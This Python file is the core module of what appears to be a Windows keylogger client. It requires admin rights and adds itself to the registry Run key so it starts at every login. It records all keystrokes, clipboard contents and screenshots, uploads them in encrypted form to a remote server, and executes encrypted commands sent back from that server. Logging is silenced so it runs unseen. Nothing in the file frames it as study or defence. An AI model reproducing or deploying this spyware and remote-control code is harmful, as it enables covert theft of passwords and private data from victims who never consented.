import threading
import time
import json
import logging
import sys
import ctypes
from datetime import datetime
from keyboard import hook, add_hotkey
from config import Config
from encryption.manager import EncryptionManager, EncryptionError
from network.communicator import ServerCommunicator, CommunicationError
from system.collector import SystemCollector
from commands.handler import CommandHandler, CommandError
from monitoring.logger import ActivityLogger
from PIL import Image
import io
import pyautogui
import os

# Configure logging based on DEBUG_MODE
if Config.DEBUG_MODE:
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(Config.ERROR_LOG_FILE),
            logging.StreamHandler()
        ]
    )
else:
    logging.getLogger().addHandler(logging.NullHandler())
    logging.getLogger().setLevel(logging.CRITICAL + 1)

class KeyloggerCore:
    def __init__(self):
        # Check admin privileges
        if not ctypes.windll.shell32.IsUserAnAdmin():
            if Config.DEBUG_MODE:
                logging.error("This program requires administrative privileges.")
            sys.exit(1)
            
        self.client_id = Config.get_client_id()
        if Config.DEBUG_MODE:
            logging.info(f"Client ID: {self.client_id}")
        self.encryption = EncryptionManager(Config.ENCRYPTION_KEY)
        self.communicator = ServerCommunicator(self.client_id, self.encryption)
        self.logger = ActivityLogger(Config.BUFFER_LIMIT)
        self.running = True
        self.add_to_startup()

    def start(self):
        self._init_hotkeys()
        self._start_service_threads()
        self._main_loop()

    def add_to_startup(self):
        import os
        import winreg
        import platform

        if platform.system().lower() != 'windows':
            if Config.DEBUG_MODE:
                logging.info("Startup registration only supported on Windows")
            return

        try:
            exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "KeyloggerClient", 0, winreg.REG_SZ, exe_path)
            if Config.DEBUG_MODE:
                logging.info("Added to registry startup")
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to add to startup: {str(e)}")

    def _init_hotkeys(self):
        add_hotkey(Config.EMERGENCY_HOTKEY, self.emergency_stop)
        hook(self.logger.log_keystroke)

    def _start_service_threads(self):
        threading.Thread(target=self._data_sync_loop, daemon=True).start()
        threading.Thread(target=self._command_loop, daemon=True).start()
        threading.Thread(target=self._clipboard_monitor_loop, daemon=True).start()

    def _capture_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            return img_byte_arr.getvalue()
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Screenshot capture error: {str(e)}")
            return None

    def _data_sync_loop(self):
        while self.running:
            try:
                if Config.DEBUG_MODE:
                    logging.info("Starting data sync...")
                system_info = SystemCollector.collect_full()
                if Config.DEBUG_MODE:
                    logging.info(f"Collected system info: {system_info}")
                screenshot = self._capture_screenshot()
                self.communicator.upload_data(
                    keystrokes=self.logger.buffer.copy(),
                    system_info=system_info,
                    screenshot=screenshot
                )
                if Config.DEBUG_MODE:
                    logging.info("Data sync completed")
                self.logger.buffer.clear()
                if Config.DEBUG_MODE:
                    logging.info(f"Sleeping for {Config.CHECK_INTERVAL} seconds")
                time.sleep(Config.CHECK_INTERVAL)
            except Exception as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Sync error: {str(e)}")
                time.sleep(5)

    def _command_loop(self):
        while self.running:
            try:
                if Config.DEBUG_MODE:
                    logging.info("Fetching commands from server...")
                commands = self.communicator.fetch_commands()
                if Config.DEBUG_MODE:
                    logging.info(f"Received {len(commands)} commands: {commands}")
                if commands:
                    self._process_commands(commands)
                time.sleep(Config.COMMAND_POLL_INTERVAL)
            except Exception as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Command processing error: {str(e)}")
                time.sleep(5)

    def _clipboard_monitor_loop(self):
        while self.running:
            try:
                self.logger.log_clipboard()
                time.sleep(10)
            except Exception as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Clipboard monitor error: {str(e)}")

    def _process_commands(self, commands):
        for cmd in commands:
            try:
                if Config.DEBUG_MODE:
                    logging.info(f"Processing command: ID={cmd['id']}, Type={cmd['type']}")
                if not all(k in cmd for k in ('id', 'command', 'type')):
                    raise CommandError(f"Invalid command structure: {cmd}")
    
                if Config.DEBUG_MODE:
                    logging.info("Starting decryption")
                decrypted = self.encryption.decrypt(cmd['command'])
                if Config.DEBUG_MODE:
                    logging.info("Decryption successful")
                    logging.info(f"Decrypted command: {decrypted}")
                command_data = json.loads(decrypted)
                if Config.DEBUG_MODE:
                    logging.info(f"Parsed command data: {command_data}")
    
                if 'type' not in command_data:
                    raise CommandError(f"Missing 'type' in decrypted command: {command_data}")
    
                if Config.DEBUG_MODE:
                    logging.info(f"Command received - Type: {command_data['type']}, Params: {command_data.get('params', {})}")
                
                result = CommandHandler.execute(
                    command_data['type'],
                    command_data.get('params', {})
                )
                
                if Config.DEBUG_MODE:
                    logging.info(f"Command executed successfully: {command_data['type']}, Result: {result}")
                self.communicator.send_command_result(cmd['id'], result)
    
            except (KeyError, json.JSONDecodeError) as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Invalid command format: {str(e)}, Command: {cmd}")
            except CommandError as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Command error: {str(e)}, Command: {cmd}")
            except CommunicationError as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Communication error: {str(e)}, Command: {cmd}")
            except Exception as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Command execution failed: {str(e)}, Command: {cmd}")

    def _handle_error(self, message):
        if Config.DEBUG_MODE:
            logging.error(message)

    def emergency_stop(self):
        self.running = False
        if Config.DEBUG_MODE:
            logging.info("Emergency stop activated")
        sys.exit(0)

    def _main_loop(self):
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.emergency_stop()

if __name__ == "__main__":
    keylogger = KeyloggerCore()
    keylogger.start()